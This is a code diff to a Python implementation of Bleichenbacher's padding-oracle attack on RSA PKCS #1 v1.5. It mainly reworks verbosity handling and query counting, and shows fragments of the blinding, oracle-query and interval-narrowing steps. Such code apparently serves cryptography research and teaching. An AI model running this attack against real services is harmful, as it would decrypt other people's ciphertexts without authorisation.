@@ -13,6 +13,9 @@ import time
 import sys
 
 
+verbosity = 0
+total_queries = 0
+
 def egcd(a, b):
     """
     Use Euclid's algorithm to find gcd of a and b
@@ -92,6 +95,9 @@ def blinding(k, key, c, oracle):
     :param oracle: oracle that checks ciphertext conformity
     :return: integers s_0, c_0 s.t. c_0 represents a conforming encryption and c_0 = (c * (s_0) ** e) mod n
     """
+    global total_queries
+    if verbosity > 0:
+        total_queries += 1
     if oracle.query(c.to_bytes(k, byteorder='big')):
         return 1, c
     while True:
@@ -99,6 +105,8 @@ def blinding(k, key, c, oracle):
         s_0 = int.from_bytes(s_0, byteorder='big') % key.n
         # Check if c_0 as defined in the attack conforms and return it if it does.
         c_0 = (c * pow(s_0, key.e, key.n)) % key.n
+        if verbosity > 0:
+            total_queries += 1
         if oracle.query(c_0.to_bytes(k, byteorder='big')):
             return s_0, c_0
 
@@ -111,12 +119,11 @@ def s_c_conform(key, c, s, oracles, k):
         next(queries[-1])  # send frame
     retval = -1
     for i, query in enumerate(queries):
-        total_queries += 1
+        if verbosity > 0:
+            total_queries += 1
         if next(query) and retval == -1:  # recv result
             retval = s + i
     return retval
-
-total_queries = 0
 
 def find_min_conforming(key, c_0, min_s, oracles, k_arg=None):
     """
@@ -191,7 +198,7 @@ def narrow_m(key, m_prev, s, B):
     return merge_intervals(intervals)
 
 
-def bleichenbacher_attack(k, key, c, oracles, verbose=False):
+def bleichenbacher_attack(k, key, c, oracles):
     """
     Given an RSA public key and an oracle for conformity of PKCS #1 encryptions, along with a value c, calculate m = (c ** d) mod n
     :param k: length of ciphertext in bytes
@@ -205,15 +212,16 @@ def bleichenbacher_attack(k, key, c, oracles, verbose=False):
     c = int.from_bytes(c, byteorder="big")
     s_0, c_0 = blinding(k, key, c, oracles[0])
 
-    if verbose:
-        print("Blinding complete")
+    print("Blinding complete")
 
     m = [(2 * B, 3 * B - 1)]
 
     i = 1
     while True:
-        if verbose:
+        if verbosity > 0:
             print("Round ", i, " (total queries %d)" % total_queries)
+        else:
+            print("Round ", i)
         if i == 1:
             s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracles, k_arg=k)
         elif len(m) > 1:
@@ -244,6 +252,7 @@ def parse_args():
     parser.add_argument("--given-enc", "-c")
     parser.add_argument("--public-key", "-k", required=True)
     parser.add_argument("--n-length", "-l", type=int, default=1024)
+    parser.add_argument("--verbose", "-v", action="count", default=0)
     return parser.parse_args()
 
 def read_pubkey(f, n_bytes):
@@ -252,6 +261,7 @@ def read_pubkey(f, n_bytes):
 
 if __name__ == "__main__":
     args = parse_args()
+    verbosity = args.verbose
     k = int(args.n_length / 8)
     with open(args.public_key, "rb") as keyfile:
         pub_key = read_pubkey(keyfile, k)
@@ -266,6 +276,6 @@ if __name__ == "__main__":
     else:
         c = b'\x00' + (k - 1) * bytes([1])
 
-    result = bleichenbacher_attack(k, pub_key, c, oracles, True)
+    result = bleichenbacher_attack(k, pub_key, c, oracles)
     print(result)
 
